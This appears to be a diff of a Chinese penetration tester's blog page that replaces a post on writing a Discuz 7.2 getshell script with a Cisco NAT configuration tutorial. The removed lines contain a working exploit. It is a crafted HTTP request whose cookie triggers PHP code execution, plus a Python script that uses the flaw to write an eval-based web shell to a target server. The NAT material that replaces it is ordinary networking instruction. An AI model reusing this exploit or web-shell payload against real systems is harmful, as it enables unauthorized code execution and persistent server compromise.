@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>安全开发-Discuz7.2Getshell脚本编写 | Falao&#39;s Blog</title>
+  <title>Cisco-网络地址转换 | Falao&#39;s Blog</title>
   <meta name="keywords" content="">
-  <meta name="description" content="安全开发-Discuz7.2Getshell脚本编写 | Falao&#39;s Blog">
+  <meta name="description" content="Cisco-网络地址转换 | Falao&#39;s Blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="ID：法老职业：渗透测试工程师证书：OSCP&#x2F;CISP-PTE">
 <meta property="og:type" content="website">
@@ -469,9 +469,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-安全开发-Discuz7-2Getshell脚本编写" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-Cisco-网络地址转换" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">安全开发-Discuz7.2Getshell脚本编写</h1>
+        <h1 class="article-title">Cisco-网络地址转换</h1>
     
     <div class="article-meta">
         
@@ -481,7 +481,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="Python专题">Python专题</a>
+            <a  data-rel="网络工程师">网络工程师</a>
             
         </span>
         
@@ -489,7 +489,7 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2021-01-28 10:59:05'>2021-01-27 09:05</time>
+            Created At : <time class="date" title='Updated At: 2021-02-12 16:36:16'>2021-02-12 16:25</time>
         
     </div>
     <div class="article-meta">
@@ -511,7 +511,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%EF%BC%9A%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-text">一：实验环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9A%E6%BC%8F%E6%B4%9E%E8%B5%B7%E5%9B%A0"><span class="toc-text">二：漏洞起因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%EF%BC%9A%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99"><span class="toc-text">三：代码编写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%88%AA%E5%9B%BE"><span class="toc-text">实验截图</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2"><span class="toc-text">网络地址转换</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%98%E7%82%B9"><span class="toc-text">优点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%BA%E7%82%B9"><span class="toc-text">缺点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NAT%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F"><span class="toc-text">NAT实现方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NAT%E8%BD%AC%E6%8D%A2%E6%9D%A1%E7%9B%AE"><span class="toc-text">NAT转换条目</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NAT%E4%B8%89%E7%A7%8D%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">NAT三种实现方式的区别</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NAT%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98"><span class="toc-text">NAT常见问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%98%BE%E7%A4%BA%E6%AF%8F%E4%B8%AA%E8%BD%AC%E5%8C%96%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="toc-text">显示每个转化的数据包</span></a></li></ol></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -527,36 +527,70 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="一：实验环境"><a href="#一：实验环境" class="headerlink" title="一：实验环境"></a>一：实验环境</h3><ul>
-<li>靶机：安装部署Ucenter与Discuz7.2</li>
-<li>攻击机：Python环境</li>
+        <h1 id="网络地址转换"><a href="#网络地址转换" class="headerlink" title="网络地址转换"></a>网络地址转换</h1><blockquote>
+<p>通过将内部网络地址的私有IP地址翻译成全球唯一的公网IP地址，是内部网络可以连接到互联网等外部网络上</p>
+</blockquote>
+<h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><ul>
+<li>节省公有合法IP地址</li>
+<li>处理地址重叠</li>
+<li>增强灵活性</li>
+<li>安全性</li>
 </ul>
-<h3 id="二：漏洞起因"><a href="#二：漏洞起因" class="headerlink" title="二：漏洞起因"></a>二：漏洞起因</h3><pre><code class="xaml">GET /viewthread.php?tid=10&amp;extra=page%3D1 HTTP/1.1    #固定访问格式
-Host: your-ip:8080
-Accept-Encoding: gzip, deflate
-Accept: */*
-Accept-Language: en
-User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
-Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();    #代码执行
-Connection: close</code></pre>
-<h3 id="三：代码编写"><a href="#三：代码编写" class="headerlink" title="三：代码编写"></a>三：代码编写</h3><pre><code class="python">'''
-POC:"&amp;x=$id=('echo%20“&lt;?php @eval($_POST[x]);?&gt;”&gt;shell.php');shell_exec($id);"
-'''
-import requests
-
-data=input("请输入写入数据：")
-file=input("请输入写入文件名：")
-
-url="http://192.168.31.49/discuz72/viewthread.php?tid=10&amp;extra=page%3D1"+"&amp;x="+"$id=('echo%20"+data+"%20&gt;%20"+file+"');shell_exec($id);"
-cookie={"Cookie":"GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval($_REQUEST[x]);"}
-print(url)
-
-code=requests.post(url,headers=cookie).status_code
-if code==200:
-    print("ok")
-else:
-    print("no")</code></pre>
-<h3 id="实验截图"><a href="#实验截图" class="headerlink" title="实验截图"></a>实验截图</h3><p>…</p>
+<h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><ul>
+<li>延迟增大</li>
+<li>配置和维护的复杂性</li>
+<li>不支持某些应用，可以通过静态NAT映射来避免</li>
+</ul>
+<h4 id="NAT实现方式"><a href="#NAT实现方式" class="headerlink" title="NAT实现方式"></a>NAT实现方式</h4><ol>
+<li><p>静态转换：IP地址的对应关系是一对一，而且是不变的，借助静态的转换，能实现网络对内部网络中某些特设定服务器的访问</p>
+<p>静态NAT配置：配置接口以及路由</p>
+<pre><code class="shell">ip nat inside source static 192.168.100.1 202.102.152.3</code></pre>
+<blockquote>
+<p>进入出口配置：ip nat outdside </p>
+<p>进入入口配置：ip nat inside </p>
+</blockquote>
+</li>
+<li><p>动态转换：IP地址的对应关系是不确定的，而是随机的，所有被授权访问互联网的私有地址可以随机转换位任何指定的合法的外部IP地址。内部网络同时访问Internet的主机数少于配置的合法地址中的IP个数时适用</p>
+<p>动态NAT配置：</p>
+<pre><code class="shell">access-list 1 permit 192.168.100.0 0.0.0.255   //全局配置模式
+ip nat pool nsd 1.1.1.1 1.1.1.2 netmast 255.255.255.248  //定义地址池名为nsd，地址池IP范围1.1.1.1到1.1.1.2   全局配置模式
+ip nat inside source list 1 pool nsd</code></pre>
+</li>
+<li><p>端口多路复用（PAT）</p>
+<blockquote>
+<p>通过改变外出数据包的源IP地址和源端口并进行端口转换，内部网络的所有主机均可共享一个合法的IP地址实现互联网的访问，节约IP </p>
+</blockquote>
+<p>PAT的配置：</p>
+<pre><code class="shell">ip nat inside source list 1 interface f0/1 overload</code></pre>
+</li>
+</ol>
+<h4 id="NAT转换条目"><a href="#NAT转换条目" class="headerlink" title="NAT转换条目"></a>NAT转换条目</h4><ul>
+<li><p>查看NAT转换条目</p>
+<pre><code class="shell">show ip nat translations //显示当前存在的转换 特权模式</code></pre>
+</li>
+<li><p>清除NAT转换条目</p>
+<pre><code class="shell">clear ip nat translation * //清除NAT转换条目中的所有条目
+注意：静态NAT条目不会被清除</code></pre>
+</li>
+</ul>
+<h4 id="NAT三种实现方式的区别"><a href="#NAT三种实现方式的区别" class="headerlink" title="NAT三种实现方式的区别"></a>NAT三种实现方式的区别</h4><ul>
+<li>静态转换的对应关系一对一且不变，并没有节约共用IP地址，只隐藏了主机的真实地址</li>
+<li>动态转换虽然在一定情况下节约了公有IP，但当内部网络访问的Internet的主机数大于合法的地址池中的IP数量时就不适用了</li>
+<li>端口多路复用可以所有内部网络共享一个合法的外部IP地址，从而最大限度节约IP地址资源</li>
+</ul>
+<h4 id="NAT常见问题"><a href="#NAT常见问题" class="headerlink" title="NAT常见问题"></a>NAT常见问题</h4><ul>
+<li>ACL阻止转换后的流量</li>
+<li>进行地址转换的ACL不全</li>
+<li>overload参数漏配</li>
+<li>不对称路由问题</li>
+<li>动态地址池IP地址范围配置错误</li>
+<li>inside和outside接口配置错误</li>
+</ul>
+<h4 id="显示每个转化的数据包"><a href="#显示每个转化的数据包" class="headerlink" title="显示每个转化的数据包"></a>显示每个转化的数据包</h4><pre><code class="shell">debug ip nat  //特权模式</code></pre>
+<blockquote>
+<p>S表示源地址  D表示目的地址</p>
+<p>192.168.1.2-&gt;4.4.4.4 表示将192.168.1.2转换为4.4.4.4</p>
+</blockquote>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 2662904153@qq.com </span>
